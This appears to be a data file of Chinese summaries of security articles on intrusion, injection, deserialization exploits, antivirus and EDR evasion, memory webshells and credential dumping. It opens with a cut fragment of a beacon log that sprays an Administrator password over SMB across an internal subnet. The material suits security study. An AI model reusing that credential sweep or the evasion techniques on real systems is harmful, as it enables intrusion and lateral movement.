[*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.59:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.115:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.126:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.142:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.154:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6\t-domain SMB:10.10.10.41:445:Administrator\tjo6ek6vul3vm,6\tWEGO\n- [*]\tTasked\tbeacon\tto\trun:\t10.10.10.1/24\t-p\t445\t-user\tAdministrator\t-pwd\tjo6ek6vul3vm,6",
        "FileName": "8639-记一次内网渗透.pdf"
    },
    {
        "page_content": "本文介绍了高级 MSSQL 注入技巧，包括利用函数实现 DNS 带外数据泄露、绕过 WAF 的基于错误的 SQL 注入、使用 FOR XML 或 FOR JSON 子句检索表内容、使用 OpenRowset() 函数检索本地文件以及从 sys.dm_exec_Requests 和 sys.dm_exec_sql_text 中检索当前查询。",
        "FileName": "8513-高级的MSSQL注入技巧.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Linux Kernel Pwn 初探，包括了 4 个不同难度的题目，从简单的控制并与硬件进行交互到利用漏洞进⾏提权，详细讲解了每个题目的原理、利⽤思路和 \t exp \t 编写。",
        "FileName": "7625-Linux Kernel Pwn 初探.pdf"
    },
    {
        "page_content": "Apache Kafka 中的 CVE-2023-25194 漏洞允许攻击者通过 JNDI 注入在 Kafka Connect worker 上执行任意代码，影响版本为 2.4.0 至 3.3.2。该漏洞可通过构造特殊的配置来利用，在 RASP 保护下，它会在 JNDI 注入处被拦截，但在业务优先模式下会触发告警。",
        "FileName": "12602-Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194).pdf"
    },
    {
        "page_content": "这篇博文介绍了作者发现的 DOMPurify 库中的一个绕过，该库用于过滤 HTML 以防止跨站点脚本 (XSS) 攻击。绕过利用了 HTML 规范中关于嵌套表单元素和命名空间处理的怪癖，允许攻击者创建恶意 HTML 标记，在解析和序列化过程中会发生突变，从而导致 XSS。",
        "FileName": "8384-通过命名空间混淆实现突变XSS - DOMPurify  2.0.17 bypass.pdf"
    },
    {
        "page_content": "该文档主要介绍了 shellcode 免杀的两种方式：分离和混淆。分离免杀包括加载器和白利用，混淆免淆包括编码、加密和注入。最后，文章还给出了技巧组合的示例。",
        "FileName": "7170-那些shellcode免杀总结.pdf"
    },
    {
        "page_content": "该文档讲述了一次通过任意文件下载漏洞引发的渗透过程。渗透者通过读取数据库连接信息，发现密码存储在 admin/web.config 文件中。由于系统对 SQL 语句进行了过滤，渗透者无法直接利用上传点。经过仔细观察，渗透者发现了一个 report 目录，猜测存在与菜单文件同名的其他目录。最终，渗透者在 admin/sys 目录下找到了一个 upload.asp 文件，并通过截断参数和修改文件名绕过文件类型限制，成功上传了 shell。",
        "FileName": "7837-一次任意文件下载引发的渗透.pdf"
    },
    {
        "page_content": "该文档详细介绍了业务漏洞挖掘的流程和方法，包括目标资产范围确定、资产收集、资产管理、业务功能理解、业务漏洞测试、逻辑漏洞测试和报告提交。文档强调了资产收集和管理的重要性，并提供了资产识别和分类的具体步骤。此外，文档还讨论了业务漏洞的类型、判断漏洞存在的方法以及自动化漏洞测试工具的使用。",
        "FileName": "9028-业务漏洞挖掘笔记.pdf"
    },
    {
        "page_content": "本文介绍了使用 Burp Suite 进行漏洞挖掘的技巧，包括安装、破解、插件选择、持久化配置、浏览器代理配置和实践示例，涵盖了 XSS、SQL 注入、SSRF、文件包含、越权和 Fastjson 漏洞的挖掘方法。",
        "FileName": "9690-我的BurpSuite食用方法.pdf"
    },
    {
        "page_content": "该文档分析了 TP3 框架中一个二次开发程序的 PHP 代码审计，发现了任意文件上传和 SQL 注入漏洞。任意文件上传漏洞允许攻击者上传恶意文件，而 SQL 注入漏洞允许攻击者通过构造恶意 SQL 查询来访问或修改数据库数据。",
        "FileName": "8085-PHP审计- TP3某二次开发程序.pdf"
    },
    {
        "page_content": "本文档主要分析了 Laravel 5.4.* 框架中的反序列化漏洞，并通过对 __destruct() 和 __wakeup() 函数的深入研究，提出了利用 R 指针引用绕过 __wakeup() 置空操作的思路。利用链条涉及对 PendingBroadcast 类中的 events 变量和 Faker 类中的 formatters 变量进行控制，最终实现任意代码执行。",
        "FileName": "11886-Laravel 5.4.反序列化——对冲__wakeup()的RCE链利用.pdf"
    },
    {
        "page_content": "该文档分析了一个加密病毒的运行效果、行为和静态代码，包括其加密算法、获取硬件信息、创建注册表项和文件操作。通过动态调试，确定了加密函数并发现了病毒创建 BAT 文件以删除自身。文档强调了动态调试在分析复杂病毒行为中的重要性。",
        "FileName": "9388-一个加密病毒的分析.pdf"
    },
    {
        "page_content": "本文档介绍了如何分析和完成一次内网横向免杀对抗渗透测试。它提供了分步指南，包括收集信息、漏洞利用、权限提升和横向移动。该文档还强调了绕过杀毒软件和使用免杀技术的重要性。",
        "FileName": "12141-记一次内网横向免杀对抗渗透测试.pdf"
    },
    {
        "page_content": "Java Agent 是一种能够在不影响正常编译的情况下，修改字节码的技术。它可以通过实现 premain 或 agentmain 方法来加载，并使用 Instrumentation 类来修改类和方法。通过使用 Javassist 库，Java Agent 可以修改方法体，从而实现内存马的注入。本文介绍了 Java Agent 的原理、使用方法和注意事项，并提供了两个扩展示例：路由劫持和替换 Shiro 的密钥。",
        "FileName": "9450-Java Agent 从入门到内存马.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Nancy 框架中 NCSRF 字段反序列化漏洞，攻击者可利用该漏洞通过 binaryformatter 反序列化执行任意代码。文档还提供了利用 ToolboxItemContainer 攻击链实现远程代码执行的详细步骤，包括生成 payload 和反序列化过程。",
        "FileName": "9594-.net反序列化之Nancy cookie反序列化及攻击链ToolboxItemContainer.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何绕过安全狗的注入和上传限制，包括内联注释绕过、异或绕过、换行符绕过、union select绕过、时间盲注和报错绕过等技术，并提供了绕过上传限制的多种方法，如等号绕过、换行绕过和填充垃圾字符绕过，最后还提供了哥斯拉免杀马子。",
        "FileName": "8377-手把手全套过狗(附tamper和哥斯拉免杀马).pdf"
    },
    {
        "page_content": "本文介绍了 Oracle 数据库注入的各种技术，包括显错注入、报错注入、布尔型盲注、延时盲注和外带数据注入。它提供了详细的示例和解释，帮助读者了解 Oracle 数据库注入的原理和实践。",
        "FileName": "9940-Oracle数据库注入全方位利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何解决 AntCTF x D^3CTF 逆向 White give 题，包括分析 main 函数逻辑、识别加密算法（AES 和 SHA256）、提取加密表、编写解密脚本并进行爆破，最终成功获取 flag。",
        "FileName": "9301-AntCTF x D^3CTF 逆向White give题解.pdf"
    },
    {
        "page_content": "该文档补充了对某 CMS 审计的分析，重点关注后台 editor 模块中的任意文件上传和读取漏洞。它描述了如何利用 create_node 和 save_file 方法上传任意文件，以及如何利用 dir_list 方法读取任意文件。文档还提供了利用这些漏洞的示例代码。",
        "FileName": "10767-对“某cms审计”的补充.pdf"
    },
    {
        "page_content": "该文档主要针对铭飞 MCMS 中的 SQL 注入漏洞进行审计，探讨如何快速定位漏洞，并介绍了利用自动化代码审计工具和人工审计思路进行漏洞挖掘的方法，强调了预编译机制的局限性，并建议使用表单过滤层或购买安全公司的代码审计服务和 WAF 防火墙产品来加强安全防护。",
        "FileName": "11907-某代码审计SQL注入篇.pdf"
    },
    {
        "page_content": "UPack 是一种运行时压缩器，它会变形 PE 文件头，导致许多 PE 装载器和模板浏览器无法正确解析其结构。本文分析了 UPack 压缩的 PE 文件头，重点关注了文件头中非标准信息的位置和含义，例如重叠文件头、可选头大小的修改、数据目录的省略以及节区头的重叠。通过使用 Stud_PE 工具，本文展示了如何解析这些变形的文件头，并提供了对解码代码、导入表修复和程序入口点 (OEP) 的调试过程。",
        "FileName": "11847-UPack压缩的PE文件头解析及调试.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 反序列化漏洞的成因，重点关注 @type 字段在反序列化过程中的作用。通过实验和代码分析，文档揭示了 @type 字段如何指定类，从而允许攻击者通过反序列化恶意 payload 来实例化任意类并触发漏洞。文档还提供了漏洞利用的示例 payload 和 Gadget chain，并讨论了不同 Fastjson 版本中 payload 的成功率差异。",
        "FileName": "8046-逆向学习fastjson反序列化始.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Ripstech Java Security 2019 日历中 16 个安全漏洞的复现过程，包括目录遍历、RCE、XSS、CSV 注入、命令执行和 SQL 注入。这些漏洞涉及 tar 提取、文件上传、find 命令、HQL 查询等功能，并提供了相应的代码示例、环境配置和 payload 构造方法。",
        "FileName": "7206-Ripstech Java Security 2019 Calendar复现系列(三).pdf"
    },
    {
        "page_content": "**主题：** Java 代码审计之 StudentManager\n\n**内容：** 该文档详细分析了 StudentManager Java 项目中的多个漏洞，包括 cookie 绕过登录验证、SQL 注入（3 处）、任意用户注册、越权更改其他用户头像、任意修改其他用户信息（包括密码）。文档提供了漏洞分析、复现步骤和通关教程，有助于理解 Java 代码审计中的常见漏洞和攻击技术。",
        "FileName": "12105-java代码审计之StudentManager.pdf"
    },
    {
        "page_content": "本文分析了 Docker 未授权漏洞的原理和形成原因，并使用 Vulhub 靶场复现漏洞。通过编写 Go 语言蜜罐代码模拟漏洞，开放端口在网络上捕获真实存在的恶意攻击行为，对恶意样本进行分析，总结出威胁情报。",
        "FileName": "11521-docker未授权漏洞蜜罐模拟与捕获分析.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用 NtDuplicateObject 函数复制远程进程句柄的技巧，从而枚举和筛选进程句柄，并最终获得目标进程的句柄副本，以便进行内存转储。",
        "FileName": "12344-利用NtDuplicateObject进行Dump.pdf"
    },
    {
        "page_content": "该文档分析了 Apache HTTP Server 中的 CVE-2023-25690 请求走私漏洞，该漏洞允许攻击者通过特定配置的 mod_proxy 和 RewriteRule 或 ProxyPassMatch 模块，在请求 URL 的某些部分与规则匹配时，造成代理请求目标错误，从而导致请求拆分和走私，引起权限绕过、缓存投毒等攻击。",
        "FileName": "12345-CVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用.pdf"
    },
    {
        "page_content": "该文档探讨了在 Spring 环境下实现内存马的各种技术，包括通过 RequestContextHolder 获取 WebApplicationContext 对象、使用 ContextLoader 获取 Root Application Context 对象，以及利用 RequestMappingHandlerMapping、AbstractUrlHandlerMapping 和 AbstractHandlerMethodMapping 等类动态创建 Controller。",
        "FileName": "11844-Spring环境下的回显总结.pdf"
    },
    {
        "page_content": "本文介绍了规避常见恶意 API 调用模式和使用直接系统调用并规避“系统调用标记”两种技术，以绕过 EDR 的检测。通过使用 syscall，可以绕过 EDR 对特定 API 的 hook，直接调用底层系统函数。此外，本文还介绍了使用 Hell's Gate、Halo's Gate、TartarusGate、ParallelSyscalls 和 GetSSN 等工具来实现 syscall 的动态调用，并讨论了如何弱化 syscall 的特征，使其更难被检测到。",
        "FileName": "11496-红队队开发基础-基础免杀(二).pdf"
    },
    {
        "page_content": "该文档介绍了内网渗透的两种思路，并详细阐述了利用 FineCMS v5 文件上传漏洞获取 Webshell、获取 Win2008 远程桌面权限、获取内网 Win7 远程桌面权限的具体步骤，强调了信息收集在渗透测试中的重要性。",
        "FileName": "10242-内网渗透---windows系统.pdf"
    },
    {
        "page_content": "本文档介绍了如何绕过新版加速乐反爬虫平台，该平台用于保护网站免受爬虫攻击。作者通过分析加速乐的工作原理，提出了三种方法来绕过其保护措施：1）直接读取本地浏览器环境中的 cookie；2）使用中转代理注入定时刷新代码；3）使用 win32api 执行键盘操作刷新浏览器。作者还提供了代码示例和操作流程，以帮助读者实施这些方法。",
        "FileName": "8030-反反爬之绕过新版加速乐.pdf"
    },
    {
        "page_content": "Armis 研究人员在施耐德电气 Modicon PLC 中发现了一个严重漏洞 (CVE-2021-22779)，该漏洞允许攻击者绕过身份验证机制，从而导致在易受攻击的 PLC 上存在原生代码的远程执行。该漏洞源于 Modbus 协议和 UMAS 协议中的设计缺陷，导致未公开的命令被滥用，从而实现对 PLC 的完全控制，包括泄露敏感信息和执行原生代码。",
        "FileName": "9860-CVE-2021-22779：Modicon PLC 中的 RCE 分析.pdf"
    },
    {
        "page_content": "该文档详细描述了利用SSRF漏洞结合Redis实现RCE的过程，包括利用dict协议获取Redis信息、利用bitop命令写入shell、利用ThinkPHP反序列化漏洞最终写入文件，以及解决过程中遇到的各种问题，如数据流中存在特殊字符、目标开启php strict模式等，最终成功获取目标服务器的shell。",
        "FileName": "7594-一次“SSRF--RCE”的艰难利用.pdf"
    },
    {
        "page_content": "本文档分析了 Laravel 5.7.X 版本中反序列化链的漏洞，并提供了六种利用该漏洞进行远程代码执行的 PoP 链。这些链利用了 Laravel 中的各种类和方法，包括 PendingCommand、ImportConfigurator、EntityPopulator 和 Logger，通过调用 call_user_func 或其他可控函数来触发 RCE。",
        "FileName": "7970-图说 Lavavel 5.7.X RCE POP 链.pdf"
    },
    {
        "page_content": "该文档探讨了 RPC 在内网中的攻击面，重点关注使用 RPC 协议绕过 EDR 等设备的有效性。它介绍了 RPC 的概念、通信过程和相关攻击面，并提供了示例代码和演示，展示了如何利用 RPC 协议进行攻击，例如枚举多网卡主机、修改用户密码和创建服务。",
        "FileName": "12257-RPC绕过EDR的研究与落地.pdf"
    },
    {
        "page_content": "本文档总结了 Java 反序列化知识，并提供了几个 CTF 例题。它介绍了 Java 反射、动态代理和内部类构造等技术，并展示了如何利用这些技术进行命令执行。此外，本文档还分析了两个 CTF 题，展示了如何利用反序列化漏洞构造 POC。",
        "FileName": "9342-java反序列化知识总结和一些ctf的例题.pdf"
    },
    {
        "page_content": "本文探讨了商业蜜罐利用 JSONP 获取信息的原理，并提出了检测和防御方法。通过分析蜜罐配置的 JSONP 接口和网站信息，可以识别蜜罐并拦截其获取信息的脚本，从而保护用户隐私。",
        "FileName": "8111-关于检测web蜜罐利用jsonp获取信息的一些想法.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Yii 2.0.42 中反序列化利用的最新全集，包括利用 __destruct、__wakeup、__call、__toString、__sleep 和 __construct 等魔术方法，以及利用字符串连接符和可控返回值来触发这些方法。该漏洞源于 Yii 项目中使用的 codeception/codeception 依赖中可利用的 __destruct 魔术方法。",
        "FileName": "9948-yii 2.0.42 最新反序列化利用全集.pdf"
    },
    {
        "page_content": "该文档分析了 Oracle WebLogic Server 中的 CVE-2021-2394 漏洞，该漏洞利用了 FilterExtractor 类绕过了 4 月份的补丁，允许攻击者通过 T3 和 IIOP 协议执行远程代码。漏洞利用了 CVE-2020-14756 和 CVE-2020-14825 反序列化链，并通过 MethodAttributeAccessor 对象绕过了黑名单限制。",
        "FileName": "10052-weblogic CVE-2021-2394 分析.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-29454 漏洞，该漏洞影响 Smarty 模板引擎，允许攻击者通过制作恶意数学字符串来执行任意 PHP 代码。文档提供了漏洞的修复方法，并展示了如何利用该漏洞绕过 open_basedir 和 disable_functions 限制。",
        "FileName": "11085-CVE-2021-29454—Smarty模板注入分析复现.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic IIOP 漏洞的回显构造，通过修改 CommonsCollections3.1 中的反序列化 gadget，将实现远程调用接口的恶意类写入服务器，并通过修改后的 gadget 执行恶意类中的绑定方法，最终实现回显。",
        "FileName": "7393-weblogic IIOP漏洞的回显构造研究.pdf"
    },
    {
        "page_content": "该文档分析了 tcache 攻击，其中攻击者利用了 large bin 中的 UAF 漏洞和任意地址写堆地址的漏洞，通过劫持 Tcache Struct，将 free_hook 覆盖为 system，最终获取 shell。",
        "FileName": "12212-tcache attack之攻击mp_.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Unsorted Bin Attack，一种利用 Glibc 堆管理中 Unsorted Bin 机制的攻击技术。该攻击通过控制 Unsorted Bin Chunk 的 bk 指针，可以修改任意地址值为一个较大的数值，从而实现任意地址的内存写入。文档还提供了利用该攻击的示例代码和详细的步骤说明。",
        "FileName": "12319-Unsorted Bin Attack.pdf"
    },
    {
        "page_content": "该文档介绍了一种绕过密码加密进行登录爆破的方法，通过使用 Selenium 设置请求超时，自动输入密码并点击登录按钮，将加密后的密码发送到 Burp 拦截，从而获取加密后的密码列表，再通过处理这些请求，提取出加密后的密码，用于爆破登录。",
        "FileName": "7706-登陆爆破之0基础绕过密码加密.pdf"
    },
    {
        "page_content": "该文档介绍了 DVWA 靶场中存储型 XSS 漏洞的分析和利用方法。它详细解释了如何通过绕过输入过滤和修改长度限制来利用漏洞，并提供了代码示例和截图来说明攻击过程。文档还强调了使用 htmlspecialchars 函数解决 XSS 漏洞的重要性，并提醒读者注意不当使用该函数可能导致绕过。",
        "FileName": "12049-DVWA靶场XSS(Stored)学习分享.pdf"
    },
    {
        "page_content": "该文档讨论了 DVWA 靶场中的反射型跨站脚本 (XSS) 漏洞，分析了不同级别的漏洞防护机制，包括黑名单过滤、双写绕过、大小写混淆绕过和 HTML 实体转换。文档还提供了利用漏洞的示例，并强调了使用此类信息时的免责声明和转载声明。",
        "FileName": "12046-DVWA靶场之XSS(Reflected)学习分享.pdf"
    },
    {
        "page_content": "本文主要介绍了 Flask 服务端模板注入（SSTI）漏洞，并通过 13 个靶场练习讲解了 SSTI 的原理、payload 构造和绕过技巧。SSTI 漏洞成因是程序员未对用户输入进行检测和判断，导致用户可控模板内容，从而通过类继承关系执行代码。防御 SSTI 漏洞推荐使用更安全的 render_template() 代替 render_template_string()。",
        "FileName": "10394-你还不会FlaskSSTI.pdf"
    },
    {
        "page_content": "该文档描述了一个在密码找回过程中发现的逻辑漏洞，该漏洞允许攻击者通过输入空值作为验证码来重置密码。漏洞的触发条件是用户在点击发送验证码按钮之前点击通过手机找回密码按钮，这会导致验证码被重置为默认值 null。后端逻辑中存在一个名为 send_flag 的字段，用于跟踪验证码是否已发送，但该字段与 cookie 关联，允许攻击者在不发送验证码的情况下重复使用它。通过利用这个漏洞，攻击者可以重置任何用户的密码，而无需知道他们的实际验证码。",
        "FileName": "8344-一个稍显诡异的逻辑漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 ShiroAttack2 工具的原理，重点关注密钥验证、利用链爆破和内存马注入等功能的实现细节。它还讨论了 Tomcat 回显方法的实现，并提供了修改 Shiro 密钥的功能。",
        "FileName": "10746-ShiroAttack2工具原理分析.pdf"
    },
    {
        "page_content": "该文档介绍了两种实现 JSP 型内存马驻留的思路：修改 Tomcat 检查 JSP 更新的时间间隔或关闭开发模式。此外，还提供了一种通过控制 JspRuntimeContext 中的内容来实现无文件落地的思路，包括定义一个继承 JspServletWrapper 类的子类，覆写 service 方法免于执行编译流程，并控制 JspRuntimeContext#addWrapper 方法绑定映射规则。",
        "FileName": "11020-浅析JSP型内存马.pdf"
    },
    {
        "page_content": "Laravel5.7 反序列化漏洞分析文章详细介绍了 Laravel5.7 版本中新增的 PendingCommand 类，该类可作为反序列化入口点，通过控制 PendingCommand 类的属性和方法，可以实例化任意类并执行其 call 方法，从而实现命令执行和任意代码执行。",
        "FileName": "10578-Laravel5.7反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Android Studio 模拟器上安装 Magisk，这是一个允许用户在模拟器中获得 root 权限的工具。该过程涉及使用 rootAVD 工具，该工具提供了一系列命令来拉取模拟器信息、安装 Magisk 并修复环境问题。文档还提供了有关保存 root 结果和配置快照管理的说明，以防止在模拟器重启后重新安装或配置软件。",
        "FileName": "12476-如何给Android Studio模拟器安装Magisk.pdf"
    },
    {
        "page_content": "该文档分析了利用自定义 TCP 栈实现远程堆溢出漏洞的细节和分析，包括漏洞触发、地址泄漏获取、代码执行等步骤，并提供了漏洞利用工具的概述。",
        "FileName": "12565-利用自定义TCP栈实现远程堆溢出漏洞——漏洞细节和分析.pdf"
    },
    {
        "page_content": "CVE-2020-14386 漏洞存在于 Linux 内核 AF_PACKET 中，该漏洞是由 tpacket_rcv 函数中 netoff 变量类型转换导致的整数溢出造成的。攻击者可以通过设置 SOCK_DGRAM/SOCK_RAW 类型 PF_PACKET 套接字的环形接收缓冲区，并启用 PACKET_VNET_HDR 选项，控制 netoff 变量，从而向上越界写 1~10 个字节，造成权限提升。",
        "FileName": "8410-CVE-2020-14386：Linux内核AF_PACKET权限提升漏洞分析.pdf"
    },
    {
        "page_content": "Zeratool 是一款基于 angr 的 CTF pwn 漏洞自动化利用工具，它通过探索程序未约束的状态，分析状态的寄存器信息和内存布局，设定约束，对约束进行求解，结合 pwntools 编写脚本，提交 payload 到远程 CTF 服务器获得 flag。",
        "FileName": "7224-zeratool：基于 angr 的CTF pwn 自动化利用工具介绍.pdf"
    },
    {
        "page_content": "本文介绍了应急响应的方法论，包括应急响应流程、信息收集、阻断、分析、清除、加固等步骤，并提供了常见的应急响应场景，强调了应急响应人员应具备威胁建模、威胁情报分析和渗透能力，以有效应对复杂的攻击。",
        "FileName": "10753-【应急响应专题】应急响应方法论.pdf"
    },
    {
        "page_content": "该文档讨论了如何利用 PHP 中的 XXE 漏洞触发反序列化漏洞，从而实现任意代码执行。它介绍了如何构造一个 Test 类的 PHAR 文件，并使用 XXE 漏洞通过 PHAR 协议解析该文件，从而执行恶意代码。文档还提供了触发 XXE 漏洞的 XML 代码示例，并解释了 PHP 支持解析 XML 外部实体的协议，包括 PHAR 协议。",
        "FileName": "10324-从xxe到phar反序列化-PHP.pdf"
    },
    {
        "page_content": "本文档探讨了 PHP 中的 GC（垃圾回收）机制，重点介绍了其对魔术方法（如 `__destruct` 和 `__wakeup`）的强制性控制。通过利用 GC 机制，攻击者可以绕过某些限制，例如在 SQL 查询中注入恶意代码，从而导致意想不到的漏洞。",
        "FileName": "12342-GC时间窃取攻击.pdf"
    },
    {
        "page_content": "该文档分析了 PHP 代码审计中发现的多个漏洞，包括任意文件读取/下载、任意文件上传、通过修改配置文件 getshell、缓存文件 getshell、SQL 注入、任意文件删除等，并提供了漏洞复现步骤和 POC。",
        "FileName": "12068-PHP代码审计之taocms.pdf"
    },
    {
        "page_content": "该文档介绍了栈溢出原理及其在编写无保护 ELF 文件中的应用。它解释了 Linux 的保护机制、大小端存储、栈帧结构和调用约定。文档还提供了使用 GDB 调试栈溢出程序的步骤，并展示了如何构造输入数据以控制程序流程。",
        "FileName": "10709-从栈溢出原理到实例利用（一）.pdf"
    },
    {
        "page_content": "该文档分析了 WebPageTest 中的两个漏洞：一个 phar 反序列化漏洞（AVD-2022-1474319）和一个 SSRF 漏洞（AVD-2022-1474320）。phar 反序列化漏洞允许攻击者通过构造恶意请求来执行任意代码，而 SSRF 漏洞允许攻击者通过扫描内网获取敏感信息。",
        "FileName": "11798-webpagetest反序列化及ssrf漏洞分析.pdf"
    },
    {
        "page_content": "Twig 模板引擎允许变量赋值、控制结构和函数调用，并提供模板继承和筛选器等功能。它还包含全局变量，如 _self、_context 和 _charset，以及可用于模板注入的筛选器和函数。",
        "FileName": "12316-Twig模板引擎注入.pdf"
    },
    {
        "page_content": "该文档介绍了 Ripstech Java Security 2019 日历中 10 个 Java 安全漏洞的复现过程，包括拒绝服务攻击、权限提升、未授权文件下载、ReDoS 和 XML 响应中的 XSS。这些漏洞涉及 StringBuilder、Files.readAllBytes()、ApiCache、GetPath、Validator 和 DispatcherServlet 等 Java 组件，并提供了环境配置、代码修改、构造 payload 和结果验证的详细步骤。",
        "FileName": "7162-Ripstech Java Security 2019 Calendar复现系列(二).pdf"
    },
    {
        "page_content": "本文档介绍了 SSH 隧道技术在实战中的应用，包括本地端⼝转发、远程端⼝转发、动态转发和 X 协议转发。这些技术允许攻击者突破防火墙限制，建立 TCP 连接，并访问远程主机上的资源。文档还提供了 SSH 隧道防御措施，例如配置远程管理白名单和使用带外管理。",
        "FileName": "7245-ssh隧道技术在实战中的使用.pdf"
    },
    {
        "page_content": "该文档分析了 WeCenter v3.3.4 中的一个反序列化漏洞，该漏洞允许攻击者通过反序列化任意 SQL 语句来执行前台 RCE。漏洞存在于 AWS_MODEL 类的析构函数中，该函数遍历了 _shutdown_query 变量并将其带入 query() 函数，而 _shutdown_query 变量是可控的。攻击者可以通过构造一个包含恶意 SQL 语句的 AWS_MODEL 对象，然后将其序列化并触发反序列化，来利用此漏洞。利用此漏洞需要找到一个可控的文件操作函数参数，并使用 phar 伪协议解析恶意文件来触发反序列化。通过修改后缀名白名单，攻击者可以上传 PHP 文件并执行 RCE。",
        "FileName": "7077-某Center v3.3.4 从前台反序列化任意SQL语句执行到前台RCE.pdf"
    },
    {
        "page_content": "该文档分析了 CNVD 通⽤漏洞库中的 bagecms 代码，通过审计和漏洞复现，发现了多个漏洞点，包括 CSRF 跨站请求伪造攻击、XSS 跨站脚本攻击、会话劫持攻击和命令执⾏漏洞，并提供了详细的挖掘思路和复现过程。",
        "FileName": "10042-审计挖掘---CNVD通用漏洞.pdf"
    },
    {
        "page_content": "该文档探讨了反调试技术，包括反虚拟机调试、反沙箱调试和伪造父进程。它提供了代码示例来实现这些技术，并解释了如何使用它们来保护后门文件免受杀毒软件的检测。",
        "FileName": "10334-调试与反调试的探究.pdf"
    },
    {
        "page_content": "本文介绍了 SRC 信息收集的思路，包括确定目标、确认测试范围、收集子域名、进行系统指纹探测、测试框架型站点漏洞、测试非框架型站点漏洞、进行端口扫描、进行目录扫描、利用 JS 文件收集信息、利用小程序和 APP 进行渗透等步骤，旨在帮助 SRC 挖掘者提高信息收集效率，挖掘更多漏洞。",
        "FileName": "10418-SRC信息收集思路分享.pdf"
    },
    {
        "page_content": "该文档记录了一次渗透测试，其中通过分析前端加密逻辑和利用后端漏洞，成功获取了目标系统的权限。测试人员通过分析官方修复补丁包中的代码，发现了目标系统中存在一个目录穿越漏洞，并利用该漏洞上传了一个包含 Webshell 的压缩包，最终获得了目标系统的控制权。",
        "FileName": "11526-记一次某系统的渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了一个 LPK 劫持恶意软件样本，该样本通过创建服务、添加注册表项和加载劫持 LPK.DLL 的 DLL 来感染系统。该恶意软件还连接到多个控制端，接收指令并执行各种操作，包括下载恶意代码、打开 IE 浏览器和更新病毒。",
        "FileName": "9930-记一次lpk劫持样本分析.pdf"
    },
    {
        "page_content": "该文档重点介绍了国外众测中发现的密码找回漏洞，包括密码重置链接未过期、密码重置无速率限制、输入长密码时拒绝服务、通过密码重置页面进行用户枚举、host 头中毒、referer 泄漏密码重置令牌、弱凭证问题、使用电子邮件参数重置密码、替换返回包中的信息等，强调了在安全和用户体验之间取得平衡的重要性。",
        "FileName": "9719-国外众测之密码找回漏洞.pdf"
    },
    {
        "page_content": "反序列化漏洞利用程序已有的函数在参数中注入代码，达到代码执行的效果。攻击者可利用反序列化漏洞，通过构造恶意请求报文远程执行命令，危害较大。反序列化漏洞的利用需要了解序列化、反序列化以及PHP中的魔术函数，如__wakeup()、__destruct()、__construct()、__toString()、__get()、__call()等。在实际攻击中，可通过构造符合条件的类和函数链，实现命令执行。为了防御反序列化漏洞，可采取过滤用户输入、使用Java 9等措施。",
        "FileName": "7023-[红日安全]Web安全Day15 - 反序列化实战攻防.pdf"
    },
    {
        "page_content": "本文深入探讨了域渗透中内存转储技术，介绍了常规手段、mimikatz、C++、C#、SharpDump、MiniDumpWriteDump、MiniDump Callbacks、LsassSilentProcessExit、SSP、RPC、PPL、EDRSandblast、Known DLLs 等技术，并分析了不同防护原理下的内存转储方法。",
